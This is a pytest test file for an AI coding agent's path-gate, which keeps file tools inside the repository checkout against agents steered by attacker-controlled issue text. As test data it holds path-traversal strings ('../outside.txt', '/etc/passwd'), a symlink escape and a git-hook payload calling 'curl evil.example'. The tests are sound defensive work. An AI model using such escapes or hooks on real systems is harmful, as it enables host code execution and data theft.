"""The path-gate: file tools may touch the checkout, and nothing else.

This is one of the two boundaries the runner's safety rests on (AGENTS.md), and
the tools it guards are driven by a model reading attacker-controlled issue
text. Every case here is an escape someone would actually try.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from agent_loop.container import ExecEnv
from agent_loop.tools import PathEscape, _resolve_in, build_tools


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    checkout = tmp_path / "checkout"
    (checkout / "src").mkdir(parents=True)
    (checkout / "src" / "app.py").write_text("print('hi')\n", encoding="utf-8")
    (checkout / ".git" / "hooks").mkdir(parents=True)
    (tmp_path / "outside.txt").write_text("secret\n", encoding="utf-8")
    return checkout


def tools(repo: Path, *, include_write: bool = True):
    env = ExecEnv(repo_path=str(repo), workdir=str(repo), container_id=None)
    return {t.name: t for t in build_tools(env, include_write=include_write)}


# ── escaping the checkout ─────────────────────────────────────────────────
@pytest.mark.parametrize(
    "path",
    [
        "../outside.txt",
        "src/../../outside.txt",
        "/etc/passwd",
        "src/./../../outside.txt",
    ],
)
def test_paths_outside_the_checkout_are_refused(repo: Path, path: str):
    with pytest.raises(PathEscape):
        _resolve_in(str(repo), path)


def test_a_symlink_pointing_out_of_the_checkout_is_refused(repo: Path):
    # realpath resolves the link, so the gate sees where it actually lands —
    # this is the case a string-prefix check would wave through.
    link = repo / "escape"
    link.symlink_to(repo.parent / "outside.txt")
    with pytest.raises(PathEscape):
        _resolve_in(str(repo), "escape")


def test_paths_inside_the_checkout_resolve(repo: Path):
    assert _resolve_in(str(repo), "src/app.py") == os.path.realpath(repo / "src" / "app.py")
    # A file that does not exist yet is fine — Write creates it.
    assert _resolve_in(str(repo), "src/new.py").endswith("/src/new.py")


# ── .git/ is inside the checkout but outside the gate ─────────────────────
@pytest.mark.parametrize("path", [".git/hooks/pre-commit", ".git/config", ".git"])
def test_the_git_directory_is_refused(repo: Path, path: str):
    """Publishing runs `git commit` on the host even when the agent's shell is
    containerised, and git runs .git/hooks/ when it does. A writable .git/ is
    host code execution, not a file write."""
    with pytest.raises(PathEscape):
        _resolve_in(str(repo), path)


async def test_write_cannot_plant_a_git_hook(repo: Path):
    result = await tools(repo)["Write"].ainvoke(
        {"file_path": ".git/hooks/pre-commit", "content": "#!/bin/sh\ncurl evil.example\n"}
    )
    assert "Error running Write" in result
    assert not (repo / ".git" / "hooks" / "pre-commit").exists()


# ── the tools report refusals rather than raising at the model ────────────
async def test_read_outside_the_checkout_returns_an_error_string(repo: Path):
    result = await tools(repo)["Read"].ainvoke({"file_path": "../outside.txt"})
    assert "Error running Read" in result
    assert "secret" not in result


async def test_write_and_edit_work_inside_the_checkout(repo: Path):
    t = tools(repo)
    assert "Wrote" in await t["Write"].ainvoke({"file_path": "src/new.py", "content": "x = 1\n"})
    assert (repo / "src" / "new.py").read_text() == "x = 1\n"

    edited = await t["Edit"].ainvoke(
        {"file_path": "src/new.py", "old_string": "x = 1", "new_string": "x = 2"}
    )
    assert "Edited" in edited
    assert (repo / "src" / "new.py").read_text() == "x = 2\n"


async def test_read_only_tool_set_has_no_write_tools(repo: Path):
    assert set(tools(repo, include_write=False)) == {"Read", "Grep", "Glob", "Bash"}


# ── Grep: bounded, and it does not leave the checkout ─────────────────────
async def test_grep_finds_matches_and_skips_binaries(repo: Path):
    (repo / "bin.dat").write_bytes(b"\x00\x01needle\x00")
    (repo / "src" / "hit.txt").write_text("a needle here\n", encoding="utf-8")

    out = await tools(repo)["Grep"].ainvoke({"pattern": "needle"})
    assert "src/hit.txt:1" in out
    assert "bin.dat" not in out, "binary files must not be searched"


async def test_grep_scoped_to_a_path_outside_the_checkout_is_refused(repo: Path):
    out = await tools(repo)["Grep"].ainvoke({"pattern": "secret", "path": ".."})
    assert "Error running Grep" in out


async def test_grep_skips_oversized_files(repo: Path, monkeypatch):
    monkeypatch.setattr("agent_loop.tools.GREP_MAX_FILE_BYTES", 16)
    (repo / "big.txt").write_text("needle" + "x" * 200, encoding="utf-8")
    assert "big.txt" not in await tools(repo)["Grep"].ainvoke({"pattern": "needle"})
